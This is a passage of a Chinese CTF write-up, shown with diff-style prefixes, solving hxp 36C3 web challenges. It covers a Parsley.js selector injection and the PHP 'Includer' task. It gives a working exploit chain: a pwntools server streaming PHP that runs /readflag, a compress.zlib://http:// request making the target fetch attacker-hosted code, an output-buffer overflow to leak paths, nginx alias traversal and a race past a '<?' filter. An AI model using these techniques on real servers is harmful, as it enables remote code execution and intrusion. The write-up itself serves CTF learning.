+</span></span></code></pre></div><p>拿到 writeup id 之后直接访问即可：</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png loading=lazy></a></figure></p><h3 id=other-selector>Other Selector</h3><p>当然该页面不仅可以使用 a 标签的 href 属性进行获取 writeup id，也可以获取它 value 值，例如：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>data-parsley-validate</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span>
+</span></span><span class=line><span class=cl>         <span class=na>id</span><span class=o>=</span><span class=s>&#34;like&#34;</span>
+</span></span><span class=line><span class=cl>         <span class=na>data-parsley-trigger</span><span class=o>=</span><span class=s>&#34;blur&#34;</span> <span class=na>autofocus</span>
+</span></span><span class=line><span class=cl>         <span class=na>name</span><span class=o>=</span><span class=s>&#34;some-field&#34;</span> 
+</span></span><span class=line><span class=cl>         <span class=na>data-parsley-error-message</span><span class=o>=</span><span class=s>&#34;&lt;input id=like type=button&gt;&#34;</span> <span class=na>data-parsley-required</span>
+</span></span><span class=line><span class=cl>         <span class=na>data-parsley-errors-container</span><span class=o>=</span><span class=s>&#34;a:contains(&#39;Writeup - 5&#39;):eq(0)&#34;</span> <span class=p>/&gt;&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>或者使用<code>data-parsley-equalto</code> API 进行判断属性值：</p><blockquote><p><strong>data-parsley-equalto="#anotherfield"</strong></p><p>Validates that the value is identical to another field&rsquo;s value (useful for password confirmation check).</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>data-parsley-validate</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> 
+</span></span><span class=line><span class=cl>        <span class=na>data-parsley-trigger</span><span class=o>=</span><span class=s>&#34;focusout&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=na>data-parsley-equalto</span><span class=o>=</span><span class=s>&#39;a[href^=&#34;/show.php?id=GUESS&#34;]&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=na>data-parsley-errors-container</span><span class=o>=</span><span class=s>&#34;form[action=&#39;/like.php&#39;]&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=na>data-parsley-error-message</span><span class=o>=</span><span class=s>&#39;&lt;input type=&#34;input&#34; name=&#34;id&#34; value=&#34;0000000000000000&#34;&gt;&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=na>value</span><span class=o>=</span><span class=s>&#39;a[href^=&#34;/show.php?id=GUESS&#34;]&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=na>autofocus</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
+</span></span></code></pre></div><h2 id=includer>Includer</h2><blockquote><p><strong>Difficulty estimate</strong>: medium</p><p><strong>Solved</strong>:9/321</p><p><strong>Points</strong>: round(1000 · min(1, 10 / (9 + [9 solves]))) = <strong>556</strong> points</p><p><strong>Description:</strong></p><p>Just sitting here and waiting for PHP 8.0 (lolphp).</p><p><strong>Download:</strong></p><p><a class=link href=https://github.com/ZeddYu/36c3-CTF-Web/blob/master/includer/includer-df39401c4c1c28ab.tar.xz target=_blank rel=noopener>includer-df39401c4c1c28ab.tar.xz (3.5 KiB)</a></p></blockquote><p>题目给出源代码以及部署文件，源代码如下：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>declare</span><span class=p>(</span><span class=nx>strict_types</span><span class=o>=</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$rand_dir</span> <span class=o>=</span> <span class=s1>&#39;files/&#39;</span><span class=o>.</span><span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>32</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$rand_dir</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;mkdir&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>putenv</span><span class=p>(</span><span class=s1>&#39;TMPDIR=&#39;</span><span class=o>.</span><span class=no>__DIR__</span><span class=o>.</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$rand_dir</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;putenv&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s1>&#39;Hello &#39;</span><span class=o>.</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39; your sandbox: &#39;</span><span class=o>.</span><span class=nv>$rand_dir</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]),</span> <span class=s1>&#39;&lt;?&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>include_once</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>finally</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;rm -rf &#39;</span><span class=o>.</span><span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$rand_dir</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><h3 id=configuration-error>Configuration Error</h3><p>其中配置文件有一个比较明显的配置错误：</p><pre tabindex=0><code class=language-config data-lang=config>location /.well-known {
   autoindex on;
   alias /var/www/html/well-known/;
 }
-</code></pre><p>开启了列目录并且我们可以遍历到上层文件夹。</p>
-<h3 id=upload-arbitrary-data>Upload Arbitrary Data</h3>
-<p>一开始我看到这个没有<code>&lt;?</code>的形式，我想到的是p牛博客里面有关死亡 exit 的内容，<a class=link href=https://www.leavesongs.com/PENETRATION/php-filter-magic.html target=_blank rel=noopener>谈一谈php://filter的妙用</a>，奈何原文用的是<code>file_put_content</code>，我们这里用的是<code>file_get_contents</code>，并且这里的判断也在使用了<code>file_get_contents</code>函数之后进行判断是否有<code>&lt;?</code>，所以这里的编码绕过就不太可能了。</p>
-<p>而且这里最奇怪的就是之前用了一些看似无关紧要的代码，比如使用了<code>putenv()</code>函数等，给了我们一个 sandbox ，然而我们似乎无法利用表面的代码进行文件上传啥的操作。</p>
-<p>balsn 队伍在公开的 wp 中写了比较详细的源码分析，这里我就配合其中的 wp 进行一下简单的分析。</p>
-<p>首先直接给出结论，我们可以使用<code>compress.zip://</code>流进行上传任意文件，接着我们来看看相关原理。</p>
-<p>在 <a class=link href=https://github.com/php/php-src target=_blank rel=noopener>php-src</a> 源代码中，我们可以找到该流的相关触发解析函数<code>php_stream_gzopen</code></p>
-<p>ext/zlib/zlib_fopen_wrapper.c</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>php_stream</span> <span class=o>*</span><span class=nf>php_stream_gzopen</span><span class=p>(</span><span class=n>php_stream_wrapper</span> <span class=o>*</span><span class=n>wrapper</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>mode</span><span class=p>,</span> <span class=kt>int</span> <span class=n>options</span><span class=p>,</span>
-							  <span class=n>zend_string</span> <span class=o>**</span><span class=n>opened_path</span><span class=p>,</span> <span class=n>php_stream_context</span> <span class=o>*</span><span class=n>context</span> <span class=n>STREAMS_DC</span><span class=p>)</span>
-<span class=p>{</span>
-	<span class=p>...</span>
-	<span class=k>if</span> <span class=p>(</span><span class=n>strncasecmp</span><span class=p>(</span><span class=s>&#34;compress.zlib://&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
-		<span class=n>path</span> <span class=o>+=</span> <span class=mi>16</span><span class=p>;</span>
-	<span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>strncasecmp</span><span class=p>(</span><span class=s>&#34;zlib:&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=mi>5</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
-		<span class=n>path</span> <span class=o>+=</span> <span class=mi>5</span><span class=p>;</span>
-	<span class=p>}</span>
-
-	<span class=n>innerstream</span> <span class=o>=</span> <span class=n>php_stream_open_wrapper_ex</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>mode</span><span class=p>,</span> <span class=n>STREAM_MUST_SEEK</span> <span class=o>|</span> <span class=n>options</span> <span class=o>|</span> <span class=n>STREAM_WILL_CAST</span><span class=p>,</span> <span class=n>opened_path</span><span class=p>,</span> <span class=n>context</span><span class=p>);</span>
-	<span class=p>...</span>
-	<span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></div><p>我们可以看到有个标志位<code>STREAM_WILL_CAST</code>，我们可以先看看这个标志位用来干嘛，在<code>main/php_streams.h</code>定义了该标志位:</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cm>/* If you are going to end up casting the stream into a FILE* or
-</span><span class=cm> * a socket, pass this flag and the streams/wrappers will not use
-</span><span class=cm> * buffering mechanisms while reading the headers, so that HTTP
-</span><span class=cm> * wrapped streams will work consistently.
-</span><span class=cm> * If you omit this flag, streams will use buffering and should end
-</span><span class=cm> * up working more optimally.
-</span><span class=cm> * */</span>
-<span class=cp>#define STREAM_WILL_CAST                0x00000020
-</span></code></pre></div><p>很明显，这是一个用来将 stream 转换成 FILE* 的标志位，在这里就与我们创建临时文件有关了。</p>
-<p>接着我们跟进<code>php_stream_open_wrapper_ex</code>函数，该函数在<code>main/php_streams.h</code>中被 define 为<code>_php_stream_open_wrapper_ex</code>。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>PHPAPI</span> <span class=n>php_stream</span> <span class=o>*</span><span class=nf>_php_stream_open_wrapper_ex</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>mode</span><span class=p>,</span> <span class=kt>int</span> <span class=n>options</span><span class=p>,</span>
-		<span class=n>zend_string</span> <span class=o>**</span><span class=n>opened_path</span><span class=p>,</span> <span class=n>php_stream_context</span> <span class=o>*</span><span class=n>context</span> <span class=n>STREAMS_DC</span><span class=p>)</span>
-<span class=p>{</span>
-	<span class=c1>//...
-</span><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=n>stream</span> <span class=o>!=</span> <span class=nb>NULL</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>options</span> <span class=o>&amp;</span> <span class=n>STREAM_MUST_SEEK</span><span class=p>))</span> <span class=p>{</span>
-		<span class=n>php_stream</span> <span class=o>*</span><span class=n>newstream</span><span class=p>;</span>
-
-		<span class=k>switch</span><span class=p>(</span><span class=n>php_stream_make_seekable_rel</span><span class=p>(</span><span class=n>stream</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>newstream</span><span class=p>,</span>
-					<span class=p>(</span><span class=n>options</span> <span class=o>&amp;</span> <span class=n>STREAM_WILL_CAST</span><span class=p>)</span>
-						<span class=o>?</span> <span class=nl>PHP_STREAM_PREFER_STDIO</span> <span class=p>:</span> <span class=n>PHP_STREAM_NO_PREFERENCE</span><span class=p>))</span>
-  <span class=c1>//...
-</span><span class=c1></span>	<span class=k>return</span> <span class=n>stream</span><span class=p>;</span>
-<span class=p>}</span>
-<span class=cm>/* }}} */</span>
-</code></pre></div><p>该函数调用了<code>php_stream_make_seekable_rel</code>，并向其中传入了<code>STREAM_WILL_CAST</code>参数，我们跟进<code>php_stream_make_seekable_rel</code>函数，它在<code>main/php_streams.h</code>中被 define 为<code>_php_stream_make_seekable</code>，继续跟进</p>
-<p>main/streams/cast.c</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cm>/* {{{ php_stream_make_seekable */</span>
-<span class=n>PHPAPI</span> <span class=kt>int</span> <span class=nf>_php_stream_make_seekable</span><span class=p>(</span><span class=n>php_stream</span> <span class=o>*</span><span class=n>origstream</span><span class=p>,</span> <span class=n>php_stream</span> <span class=o>**</span><span class=n>newstream</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span> <span class=n>STREAMS_DC</span><span class=p>)</span>
-<span class=p>{</span>
-	<span class=k>if</span> <span class=p>(</span><span class=n>newstream</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
-		<span class=k>return</span> <span class=n>PHP_STREAM_FAILED</span><span class=p>;</span>
-	<span class=p>}</span>
-	<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
-
-	<span class=k>if</span> <span class=p>(((</span><span class=n>flags</span> <span class=o>&amp;</span> <span class=n>PHP_STREAM_FORCE_CONVERSION</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>origstream</span><span class=o>-&gt;</span><span class=n>ops</span><span class=o>-&gt;</span><span class=n>seek</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
-		<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=n>origstream</span><span class=p>;</span>
-		<span class=k>return</span> <span class=n>PHP_STREAM_UNCHANGED</span><span class=p>;</span>
-	<span class=p>}</span>
-
-	<span class=cm>/* Use a tmpfile and copy the old streams contents into it */</span>
-
-	<span class=k>if</span> <span class=p>(</span><span class=n>flags</span> <span class=o>&amp;</span> <span class=n>PHP_STREAM_PREFER_STDIO</span><span class=p>)</span> <span class=p>{</span>
-		<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=n>php_stream_fopen_tmpfile</span><span class=p>();</span>
-	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-		<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=n>php_stream_temp_new</span><span class=p>();</span>
-	<span class=p>}</span>
-	<span class=c1>//...
-</span><span class=c1></span><span class=p>}</span>
-<span class=cm>/* }}} */</span>
-</code></pre></div><p>我们可以看到如果<code>flags</code>与<code>PHP_STREAM_PREFER_STDIO</code>都被设置的话，而<code>PHP_STREAM_PREFER_STDIO</code>在 main/php_streams.h 中已经被 define</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#define PHP_STREAM_PREFER_STDIO		1
-</span></code></pre></div><p>我们只需要关心 flags 的值就好了，我们只需要确定 flags 的值非零即可，根据前面的跟进我们易知 flags 的在这里非零，所以这里就调用了<code>php_stream_fopen_tmpfile</code>函数创建了临时文件。</p>
-<p>于是我们可以做一个简单的验证，在本机上跑源代码，并用 pwntools 起一个服务用来发送一个大文件</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
-<span class=kn>import</span> <span class=nn>requests</span>
-<span class=kn>import</span> <span class=nn>re</span>
-<span class=kn>import</span> <span class=nn>threading</span>
-<span class=kn>import</span> <span class=nn>time</span>
-
-
-<span class=k>def</span> <span class=nf>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
-    <span class=n>l</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;</span><span class=si>{}</span><span class=se>\r</span><span class=s1>
-</span><span class=s1></span><span class=si>{}</span><span class=se>\r</span><span class=s1>
-</span><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))[</span><span class=mi>2</span><span class=p>:],</span> <span class=n>data</span><span class=p>))</span>
-
-<span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
-    <span class=n>l</span> <span class=o>=</span> <span class=n>listen</span><span class=p>(</span><span class=mi>9999</span><span class=p>)</span>
-    <span class=n>l</span><span class=o>.</span><span class=n>wait_for_connection</span><span class=p>()</span>
-
-    <span class=n>data1</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;X&#39;</span><span class=p>)</span>
-    <span class=n>data2</span> <span class=o>=</span> <span class=s1>&#39;&lt;?php system(&#34;/readflag&#34;); exit(); /*&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span><span class=p>)</span>
-    <span class=n>data3</span> <span class=o>=</span> <span class=s1>&#39;c*/&#39;</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;c&#39;</span><span class=p>)</span>
-
-    <span class=n>l</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\r\n\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
-    <span class=n>l</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;HTTP/1.1 200 OK</span><span class=se>\r</span><span class=s1>
-</span><span class=s1>Content-Type: exploit/revxakep</span><span class=se>\r</span><span class=s1>
-</span><span class=s1>Connection: close</span><span class=se>\r</span><span class=s1>
-</span><span class=s1>Transfer-Encoding: chunked</span><span class=se>\r</span><span class=s1>
-</span><span class=s1></span><span class=se>\r</span><span class=s1>
-</span><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>
-
-    <span class=n>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data1</span><span class=p>)</span>
-
-    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;waiting...&#39;</span><span class=p>)</span>
-    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;sending php code...&#39;</span><span class=p>)</span>
-
-    <span class=n>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data2</span><span class=p>)</span>
-
-    <span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
-
-    <span class=n>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data3</span><span class=p>)</span>
-
-    <span class=n>l</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;0</span><span class=se>\r</span><span class=s1>
-</span><span class=s1></span><span class=se>\r</span><span class=s1>
-</span><span class=s1></span><span class=se>\r</span><span class=s1>
-</span><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>
-    <span class=n>l</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
-</code></pre></div><p>这样我在本机上用 fswatch 很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。</p>
-<p><figure>
-<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png loading=lazy>
-</a>
-</figure></p>
-<h3 id=keep-temp-file>Keep Temp File</h3>
-<p>临时文件终究还是会被 php 删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留存在服务器上，这样我们才有机会去包含它。</p>
-<p>所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间：</p>
-<ul>
-<li>使用大文件传输，这样在传输的时候就会有一定的时间让我们包含到文件了。</li>
-<li>使用 FTP 速度控制，大文件传输根本上还是传输速度的问题，我们可以通过一些方式限制传输速率，比较简单的也可以利用<code>compress.zlib://ftp://</code>形式，控制 FTP 速度即可</li>
-</ul>
-<h3 id=bypass-waf>Bypass Waf</h3>
-<p>接下来我们就要看如何来对关键地方进行绕过了。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php>    <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]),</span> <span class=s1>&#39;&lt;?&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
-        <span class=k>include_once</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]);</span>
-    <span class=p>}</span>
-</code></pre></div><p>这个地方问了很多师傅，包括一血的 TokyoWesterns 的队员以及参考了主要的公开 WP，基本都是利用两个函数之间极端的时间窗进行绕过。</p>
-<p>什么意思呢？也就是说，在极其理想的情况下，我们通过自己的服务先发送一段垃圾数据，这时候通过<code>stripos</code>的判断就是没有 PHP 代码的文件数据，接着我们利用 HTTP 长链接的形式，只要这个链接不断开，在我们绕过第一个判断之后，我们就可以发送第二段含有 PHP 代码的数据了，这样就能使<code>include_once</code>包含我们的代码了。</p>
-<p>因为我们无法知道什么时候能绕过第一个判断，所以这里的方法只能利用竞争的形式去包含临时文件，这里是第二个我们需要竞争的点。</p>
-<h3 id=leak-dir-path>Leak Dir path</h3>
-<p>最后，要做到文件包含，自然得先知道它的文件路径，而文件路径每次都是随机的，所以我们又不得不通过某些方式去获取路径。</p>
-<p>虽然我们可以直接看到题目是直接给出了路径，但是乍一看代码我们貌似只能等到全部函数结束之后才能拿到路径，然而之前我们说到的需要保留的长链接不能让我们立即得到我们的 sandbox 路径。</p>
-<p>所以我们需要通过传入过大的 name 参数，导致 PHP output buffer 溢出，在保持连接的情况下获取沙箱路径，参考代码：</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python>    <span class=n>data</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;file=compress.zlib://http://192.168.151.132:8080&amp;name=&#39;&#39;&#39;</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=o>+</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>7</span> <span class=o>+</span> <span class=mi>882</span><span class=p>)</span>
-    <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;POST / HTTP/1.1</span><span class=se>\r</span><span class=s1>
-</span><span class=s1>Host: localhost</span><span class=se>\r</span><span class=s1>
-</span><span class=s1>Connection: close</span><span class=se>\r</span><span class=s1>
-</span><span class=s1>Content-Length: </span><span class=si>{}</span><span class=se>\r</span><span class=s1>
-</span><span class=s1>Content-Type: application/x-www-form-urlencoded</span><span class=se>\r</span><span class=s1>
-</span><span class=s1>Cookie: PHPSESSID=asdasdasd</span><span class=se>\r</span><span class=s1>
-</span><span class=s1></span><span class=se>\r</span><span class=s1>
-</span><span class=s1></span><span class=si>{}</span><span class=se>\r</span><span class=s1>
-</span><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>),</span> <span class=n>data</span><span class=p>))</span>
-</code></pre></div><h3 id=get-flag>Get Flag</h3>
-<p>所以整个流程我们可以总结为以下：</p>
-<ol>
-<li>利用 <code>compress.zlib://http://</code>or<code>compress.zlib://ftp://</code> 来上传任意文件，并保持 HTTP 长链接竞争保存我们的临时文件</li>
-<li>利用超长的 name 溢出 output buffer 得到 sandbox 路径</li>
-<li>利用 Nginx 配置错误，通过 <code>.well-known../files/sandbox/</code>来获取我们 tmp 文件的文件名</li>
-<li>发送另一个请求包含我们的 tmp 文件，此时并没有 PHP 代码</li>
-<li>绕过 WAF 判断后，发送 PHP 代码段，包含我们的 PHP 代码拿到 Flag</li>
-</ol>
-<p>整个题目的关键点主要是以下几点(来自 @wupco)：</p>
-<ol>
-<li>需要利用大文件或ftp速度限制让连接保持</li>
-<li>传入name过大 overflow output buffer，在保持连接的情况下获取沙箱路径</li>
-<li>tmp文件需要在两种文件直接疯狂切换，使得第一次<code>file_get_contents</code>获取的内容不带有<code>&lt;?</code>,<code>include</code>的时候是正常php代码，需要卡时间点，所以要多跑几次才行</li>
-<li><code>.well-known../files/</code>是nginx配置漏洞，就不多说了，用来列生成的tmp文件</li>
-</ol>
-<p>由于第二个极短的时间窗，我们需要比较准确地调控延迟时间，之前没调控好时间以及文件大小，挂一晚上脚本都没有 hit 中一次，第二天经过 @rebirth 的深刻指点，修改了一下延迟时间以及服务器响应的文件的大小，成功率得到了很大的提高，基本每次都可以 getflag。</p>
-<p><figure>
-<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png loading=lazy>
-</a>
-</figure></p>
-<p>脚本放在<a class=link href=https://gist.github.com/ZeddYu/42159da911e82dba923b375a9f64ad65 target=_blank rel=noopener>gist-exp.py</a>，其中 192.168.34.1 是本地题目地址，192.168.151.132 是 client 的地址。</p>
-<h2 id=references>References</h2>
-<p><a class=link href=https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/ target=_blank rel=noopener>20191228-hxp36c3ctf</a></p>
-<p><a class=link href=https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0 target=_blank rel=noopener>https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0</a></p>
-<p><a class=link href=https://ctftime.org/task/10211 target=_blank rel=noopener>https://ctftime.org/task/10211</a></p>
-</section>
-<footer class=article-footer>
-<section class=article-tags>
-<a href=/tags/CTF/>CTF</a>
-</section>
-<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
-<span>Licensed under CC BY-NC-SA 4.0</span>
-</section>
-<div class="notice notice-tip">
-<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
-<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
-<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
-</div>
-</footer>
-</article>
-<aside class=related-contents--wrapper>
-<h2 class=section-title>Related contents</h2>
-<div class=related-contents>
-<div class="flex article-list--tile">
-<article>
-<a href=/2022/02/21/2022-02-21-PracticalTimingTimeless/>
-<div class=article-details>
-<h2 class=article-title>Writeup for A More Secure Pastebin - Practical Timeless Timing in Browser</h2>
-</div>
-</a>
-</article>
-<article>
